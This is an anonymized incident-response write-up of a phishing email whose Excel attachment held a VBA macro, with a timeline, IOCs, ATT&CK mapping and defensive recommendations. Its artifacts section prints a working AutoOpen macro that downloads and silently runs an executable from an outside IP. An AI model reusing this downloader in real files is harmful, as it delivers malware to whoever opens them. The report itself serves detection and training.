ğŸ›¡ Phishing Email with Malicious Attachment (Anonymized)
ğŸ“Œ Executive Summary

A user reported a suspicious email with an attached Excel file.
The file contained an obfuscated VBA macro that attempted to download a remote payload.
The payload download was blocked by the corporate proxy, preventing further compromise.

ğŸ¯ Outcome: early user report + proxy block stopped attack before execution.

___________________________________________________________________________________________________________________________________________________

## ğŸ–¼ Attack Flow (ASCII Diagram)

+---------------------------+
| Phishing Email Delivered  |
| (Excel w/ Macro)          |
+---------------------------+
             |
             v
+---------------------------+
| User Opens File â†’ Macro   |
| Execution Prompt          |
+---------------------------+
             |
             v
+---------------------------+
| Macro Attempts Download   |
| Remote EXE via HTTP       |
+---------------------------+
             |
             v
+---------------------------+
| Proxy Blocks Connection   |
+---------------------------+
             |
             v
+---------------------------+
| Incident Closed w/ User   |
| Awareness Training        |
+---------------------------+

___________________________________________________________________________________________________________________________________________________

ğŸ“– Attack Narrative


ğŸ“¨ Stage 1 â€“ Delivery

External email delivered to user inbox with Excel attachment (Invoice_Q3.xlsm).

Sender spoofed a trusted vendor domain.


ğŸ§‘â€ğŸ’» Stage 2 â€“ Execution Attempt

User opened file, was prompted to enable macros.

Obfuscated VBA macro triggered.


ğŸŒ Stage 3 â€“ Payload Retrieval Attempt

Macro attempted URLDownloadToFileA â†’ download payload.exe from hxxp://185.199.111.25/update/payload.exe.

Proxy blocked HTTP connection.


ğŸ›¡ Stage 4 â€“ Containment

SOC analyzed headers and sandbox results.

IOC shared to mail gateway, user provided phishing awareness refresher.

___________________________________________________________________________________________________________________________________________________


â± Timeline (UTC)


| Time  | Event                                                 |
| ----- | ----------------------------------------------------- |
| 14:12 | ğŸ“¨ User reports suspicious email to SOC               |
| 14:20 | ğŸ” Email headers analyzed; spoof confirmed            |
| 14:32 | ğŸ§ª Sandbox detonation shows VBA macro w/ HTTP request |
| 14:35 | ğŸ›¡ Proxy logs confirm block of outbound IP             |
| 15:00 | ğŸ“š User re-educated; IOC shared with mail gateway     |

___________________________________________________________________________________________________________________________________________________

ğŸ“‚ Artifacts (Synthetic / Anonymized)

Email Header Snippet:

Received: from mail.fakevendor.com (185.199.111.25)
From: "Accounts Payable" <billing@fakevendor.com>
To: user@company.org
Subject: Invoice Q3 Review
Attachment: Invoice_Q3.xlsm

Sandbox Extracted VBA (Deobfuscated):

Sub AutoOpen()
  URL = "http://185.199.111.25/update/payload.exe"
  Target = Environ("TEMP") & "\payload.exe"
  URLDownloadToFileA 0, URL, Target, 0, 0
  Shell Target, vbHide
End Sub


Proxy Log (Blocked Connection):

{
  "time": "2025-07-11T14:35:02Z",
  "user": "user@company.org",
  "srcIP": "10.10.45.33",
  "dstIP": "185.199.111.25",
  "url": "http://185.199.111.25/update/payload.exe",
  "action": "BLOCK",
  "reason": "Malicious site (TI feed)"
}

___________________________________________________________________________________________________________________________________________________


ğŸ’» Attacker Technique (Reconstructed)

# Macro executed (VBA API call)
URLDownloadToFileA http://185.199.111.25/update/payload.exe C:\Users\user\AppData\Temp\payload.exe

# Attempted execution (blocked)
payload.exe

___________________________________________________________________________________________________________________________________________________


ğŸ§¾ IOCs (Synthetic)


| Type      | Value                                                   | Source           | Status    |
| --------- | ------------------------------------------------------- | ---------------- | --------- |
| ğŸŒ IP     | 185.199.111.25                                          | Proxy logs       | Malicious |
| ğŸ“§ Email  | [billing@fakevendor.com](mailto:billing@fakevendor.com) | Email header     | Spoofed   |
| ğŸ“ File   | Invoice\_Q3.xlsm (SHA256: a1b2c3â€¦)                      | Sandbox detonate | Malicious |
| ğŸ›  Binary | payload.exe (downloaded attempt)                        | Macro code       | Blocked   |
| ğŸŒ URL    | hxxp\://185.199.111.25/update/payload.exe               | VBA macro        | Malicious |

___________________________________________________________________________________________________________________________________________________


ğŸ”‘ Key Findings

ğŸ“ Excel file with malicious macro.

ğŸ§© Macro used URLDownloadToFileA to fetch payload.

ğŸŒ Payload server already listed in TI feeds.

ğŸ›¡ Proxy blocked the connection â†’ no host compromise.

___________________________________________________________________________________________________________________________________________________


ğŸ—‚ï¸ MITRE ATT&CK Mapping

T1566.001 â€“ Spearphishing Attachment

T1204 â€“ User Execution

T1105 â€“ Ingress Tool Transfer

___________________________________________________________________________________________________________________________________________________


ğŸ‘€ Detection Use Cases

ğŸš¨ Alert on Office files with macros from external senders.

ğŸš¨ Detect HTTP requests to suspicious IPs/domains.

ğŸ§© Match attachment hashes against TI feeds.

ğŸš¨ Alert on execution of Office child-processes spawning cmd.exe / powershell.exe.

___________________________________________________________________________________________________________________________________________________


ğŸ›¡ï¸ Response Actions

âŒ Quarantined email and attachment.

ğŸ›¡ Blocked domain/IP on proxy & mail gateway.

ğŸ“‘ Shared IOC with wider detection team.

ğŸ“š User awareness training reinforced.

___________________________________________________________________________________________________________________________________________________


ğŸ›¡ï¸ Recommendations

ğŸ”’ Block Office macros by default.

ğŸ“§ Improve mail filtering with SPF/DKIM/DMARC.

ğŸš¨ Integrate TI feeds into mail and web filtering.

ğŸ“š Ongoing phishing simulation & user training.
